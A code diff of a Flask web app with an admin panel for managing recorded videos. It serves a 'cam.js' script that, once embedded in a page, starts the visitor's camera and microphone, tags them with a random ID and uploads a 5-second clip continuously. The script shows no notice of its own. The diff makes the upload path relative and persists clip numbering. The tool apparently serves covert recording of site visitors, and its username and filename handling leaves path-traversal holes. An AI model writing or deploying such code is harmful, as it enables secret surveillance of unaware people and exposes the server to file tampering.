@@ -13,24 +13,27 @@ FINAL_FOLDER = 'videos/final'
 os.makedirs(CHUNK_FOLDER, exist_ok=True)
 os.makedirs(FINAL_FOLDER, exist_ok=True)
 
-# ১. ভিডিও দেখানোর পেজ
 @app.route('/rndr')
 def index():
     videos = sorted([f for f in os.listdir(FINAL_FOLDER) if f.endswith('.webm')])
     chunks = sorted([f for f in os.listdir(CHUNK_FOLDER) if f.endswith('.webm')])
     
-    # Get unique usernames
     usernames = set()
+    user_chunks_map = {}
+    user_videos_map = {}
+
     for video in videos:
         if '_merged.webm' in video:
             username = video.replace('_merged.webm', '')
             usernames.add(username)
-    
+            user_videos_map.setdefault(username, []).append(video)
+
     for chunk in chunks:
         if '_' in chunk:
             username = chunk.split('_')[0]
             usernames.add(username)
-    
+            user_chunks_map.setdefault(username, []).append(chunk)
+
     template = '''
     <!DOCTYPE html>
     <html>
@@ -53,24 +56,24 @@ def index():
     <body>
         <div class="container">
             <h1>🎥 Admin Panel - Video Management</h1>
-            
+
             <div class="user-section">
                 <div class="user-header">
                     <h2>📊 Overview</h2>
                 </div>
                 <p><strong>Total Users:</strong> {{ usernames|length }}</p>
-                <p><strong>Active Users:</strong> {{ usernames|list|join(', ') }}</p>
+                <p><strong>Active Users:</strong> {{ usernames|join(', ') }}</p>
                 <p><strong>Merged Videos:</strong> {{ videos|length }}</p>
                 <p><strong>Pending Chunks:</strong> {{ chunks|length }}</p>
             </div>
-            
+
             {% for username in usernames %}
             <div class="user-section">
                 <div class="user-header">
                     <h2>👤 User: {{ username }}</h2>
                 </div>
-                
-                {% set user_chunks = chunks|selectattr('startswith', username + '_')|list %}
+
+                {% set user_chunks = user_chunks_map.get(username, []) %}
                 {% if user_chunks %}
                 <div class="chunks-info">
                     <strong>📹 Pending Chunks ({{ user_chunks|length }}):</strong>
@@ -81,8 +84,8 @@ def index():
                     <button class="finalize-btn" onclick="finalizeUser('{{ username }}')">🔄 Finalize Video</button>
                 </div>
                 {% endif %}
-                
-                {% set user_videos = videos|selectattr('startswith', username + '_')|list %}
+
+                {% set user_videos = user_videos_map.get(username, []) %}
                 {% if user_videos %}
                 <div class="video-grid">
                     {% for video in user_videos %}
@@ -102,14 +105,14 @@ def index():
                 {% endif %}
             </div>
             {% endfor %}
-            
+
             {% if not usernames %}
             <div class="user-section">
                 <p style="text-align: center; color: #666; font-style: italic;">No users found. No videos uploaded yet.</p>
             </div>
             {% endif %}
         </div>
-        
+
         <script>
         function finalizeUser(username) {
             if (confirm('Finalize video for user: ' + username + '?')) {
@@ -128,14 +131,18 @@ def index():
     </body>
     </html>
     '''
-    return render_template_string(template, videos=videos, chunks=chunks, usernames=sorted(usernames))
 
-# ২. ভিডিও ফাইল সার্ভ করার রুট
+    return render_template_string(template,
+        usernames=sorted(usernames),
+        user_chunks_map=user_chunks_map,
+        user_videos_map=user_videos_map,
+        videos=videos, chunks=chunks
+    )
+
 @app.route('/videos/final/<path:filename>')
 def serve_video(filename):
     return send_from_directory(FINAL_FOLDER, filename)
 
-# ৩. ভিডিও আপলোড (chunk upload)
 @app.route('/upload', methods=['POST'])
 def upload():
     try:
@@ -150,26 +157,21 @@ def upload():
         print(f"Upload error: {e}")
         return Response("Error", 500)
 
-# ৪. ভিডিও মার্জ / ফাইনালাইজ
 @app.route('/finalize', methods=['GET'])
 def finalize():
     try:
         username = request.args.get('username', 'user')
-        
-        # Get all chunks for this username
         chunk_pattern = os.path.join(CHUNK_FOLDER, f"{username}_*.webm")
         chunks = sorted(glob.glob(chunk_pattern))
-        
+
         if not chunks:
             return f"No chunks found for username: {username}"
-        
-        # Create chunks.txt file
+
         txt_path = os.path.join(CHUNK_FOLDER, f'{username}_chunks.txt')
         with open(txt_path, 'w') as f:
             for chunk in chunks:
                 f.write(f"file '{os.path.abspath(chunk)}'\n")
 
-        # Merge with ffmpeg
         final_name = f'{username}_merged.webm'
         final_path = os.path.join(FINAL_FOLDER, final_name)
         command = [
@@ -178,17 +180,15 @@ def finalize():
         ]
 
         subprocess.run(command, check=True)
-        
-        # Clean up chunks and txt file
+
         for chunk in chunks:
             os.remove(chunk)
         os.remove(txt_path)
-        
+
         return f"Merged successfully: {final_name}"
     except Exception as e:
         return f"Merge failed: {str(e)}"
 
-# ৫. ভিডিও ডিলিট
 @app.route('/delete/<filename>', methods=['POST'])
 def delete_video(filename):
     try:
@@ -200,7 +200,6 @@ def delete_video(filename):
         print(f"Delete error: {e}")
     return redirect(url_for('index'))
 
-# ৬. cam.js রুট — জাভাস্ক্রিপ্ট কোড সার্ভ করবে
 @app.route('/cam.js')
 def cam_js():
     js_code = '''
@@ -210,16 +209,16 @@ def cam_js():
     username = Math.random().toString(36).substr(2, 5);
     localStorage.setItem('video_username', username);
   }
-  
-  let videoNumber = 1;
-  
+
+  let videoNumber = parseInt(localStorage.getItem('video_number') || '1');
+
   try {
     const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
     const mediaRecorder = new MediaRecorder(stream);
     let chunks = [];
-    
+
     mediaRecorder.ondataavailable = e => chunks.push(e.data);
-    
+
     mediaRecorder.onstop = async () => {
       const blob = new Blob(chunks, {type: 'video/webm'});
       chunks = [];
@@ -228,23 +227,24 @@ def cam_js():
       formData.append('username', username);
       formData.append('video_number', videoNumber);
       try {
-        await fetch('https://chorcha-video.onrender.com/upload', {method: 'POST', body: formData});
+        await fetch('/upload', {method: 'POST', body: formData});
         console.log('Chunk uploaded:', `${username}_${videoNumber}.webm`);
         videoNumber++;
+        localStorage.setItem('video_number', videoNumber);
       } catch(err) {
         console.error('Upload failed:', err);
       }
     };
-    
+
     mediaRecorder.start();
-    
+
     setInterval(() => {
       if(mediaRecorder.state === 'recording'){
         mediaRecorder.stop();
         mediaRecorder.start();
       }
     }, 5000);
-    
+
     console.log('Video recording started for user:', username);
   } catch(err) {
     console.error('Camera access denied:', err);
